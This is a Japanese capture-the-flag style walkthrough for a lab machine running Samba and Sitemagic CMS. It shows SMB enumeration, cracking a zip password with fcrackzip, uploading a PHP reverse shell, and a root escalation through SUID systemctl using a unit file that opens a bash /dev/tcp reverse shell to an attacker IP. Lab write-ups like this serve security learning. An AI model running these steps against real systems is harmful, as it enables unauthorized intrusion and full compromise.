### 論点
- systemctl,sitemagic cms
### keyword
- fcrackzip,smb,reverse-shell.php

## 攻略
- nmap
  -　22,80,139,445, 
- webサイトを見ても何もない
- goubsterしても特に何もなし
- (補足)sambaを調べるが、バージョン6にはない　
  - `enum4linux -a $IP`
- 139&445はsambaというポートを調べる
  - `smbmap -H $IP` または `smbmap -H $IP -u '' -p ''`どっちも同じ
  - `Files`というのが見つかる
- smbにログインする 
  - `smbclient //$IP/Files`
  - ファイルをダウンロードする 
- website.zipを解読するが、パスワードがかかっている
  - `fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u website.zip`
  - passwordはporchman 
- sitemagicのフォルダを見る
  - `cat config.xml.php`
  - ユーザ名とパスワードがわかるのでメモる 
- サイトを見る
  - sitemagic cmsというcmsらしい 
- サイトを見てログインする
  - Content -> files -> Upload
  - http://$IP/sitemagicにログインしてphp-reverse-shellをuploadする
- reverse-shellする
  - Parrotで待ち受ける `nc -nlvp 9001` 
  - http://$IP/sitemagic/files/images/php-reverse-shell.phpにアクセスする
  - プロンプトが返ってくる
- 対話型シェルにする
- システム内探索
  - `id` 特にない
  - `sudo -l`なし 
- SUID
  - pkexecがあるが、他にsystemctlという珍しいのがある。これをgtfobinsを調べる
- m3.serviceファイルを作る
  - parrotで次のファイルを作る。ファイル名はm3.serviceとする
```
[Unit]
Description=m3.service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.56.101/9001 0>&1"

[Install]
WantedBy=multi-user.target
```

- target側では、wgetコマンドでいつもの/tmpでなく/dev/shmでm3.serviceファイルを受け取る
- parrot側でncコマンドで待ち受ける
  - `nc -nlvp 9001`
- rootになる 
  - 次のコマンドをターゲット側でする
  - `/bin/systemctl link /dev/shm/m3.service`
  - `/bin/systemctl start m3.service`
  - このコマンドを実行後にすぐにparrot側でリバースシェルできる
 



